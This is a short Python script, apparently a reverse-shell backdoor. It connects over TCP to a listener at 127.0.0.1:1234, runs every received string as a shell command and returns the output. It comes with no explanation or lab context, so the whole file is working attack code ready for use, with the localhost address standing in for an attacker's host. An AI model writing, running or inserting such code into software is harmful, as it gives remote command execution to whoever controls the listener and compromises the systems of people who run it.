import subprocess,socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(('127.0.0.1', 1234))
while True:
	d = s.recv(1024)
	p = subprocess.Popen(d.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	out, err = p.communicate()
	s.send(out);s.send(err)
